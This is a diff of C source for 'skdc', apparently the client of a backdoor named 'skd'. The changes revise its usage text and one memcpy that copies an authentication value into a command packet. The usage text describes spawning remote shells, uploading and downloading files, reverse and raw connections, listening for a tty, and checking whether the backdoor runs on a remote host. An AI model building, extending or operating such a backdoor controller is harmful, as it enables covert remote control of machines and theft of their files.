@@ -52,16 +52,16 @@ int usage(char *s) {
     printf("skdc - <whats[@t]wekk.net>\n"
            "==========================\n"
         "Usage:\n"
-        "%s -a {shell|down|up|check|listen} -c {tcp|raw|rev} -h ip/hostname -l local_port -d dest_port [-f file] [-t secs]\n"
+        "%s -a {shell|down|up|check|listen} [-c {tcp|raw|rev}] [-h host] [-l port] [-d port] [-f file] [-t secs]\n"
         "   -a: action to execute\n"
-        "      * shell => launches a shell (-hd required)\n"
-        "      * down => download a file (-hdf required)\n"
-        "      * up => uploads a file (-hdf required)\n"
-        "      * listen => listen for a tty connection (-l required)\n"
-        "      * check => check if skd is running on remote host (-hd required)\n"
-		"   -c: connection type\n"
-        "      * tcp => a direct tcp connection to the server\n"
-        "      * rev => ask for a reverse connection (-hld required)\n"
+        "      * shell => launches a shell (-c required)\n"
+        "      * down => download a file (-f required)\n"
+        "      * up => uploads a file (-cf required)\n"
+        "      * listen => listen for a tty connection (-cl required)\n"
+        "      * check => check if skd is running on remote host (-cd required)\n"
+		"   -c: connection type (-h required)\n"
+        "      * tcp => a direct tcp connection to the server (-d required)\n"
+        "      * rev => ask for a reverse connection (-ld required)\n"
         "      * raw => raw connection (only transfer small files) (-ld required)\n"
 		"   -h: host or ip address\n"
 		"   -l: local port to listen (enables reverse mode and disables raw mode)\n"
@@ -447,7 +447,7 @@ void tcp_action(int action, short local_port, char *host, short dest_port, char 
     }
 
     // Generate packet
-    memcpy(cmdpkt.pass, clientauth, 20);
+    memcpy(cmdpkt.pass, clientauth, sizeof(clientauth));
     cmdpkt.port = local_port;
     cmdpkt.action = action;
 	if (file) memcpy(cmdpkt.bytes, file, strlen(file));
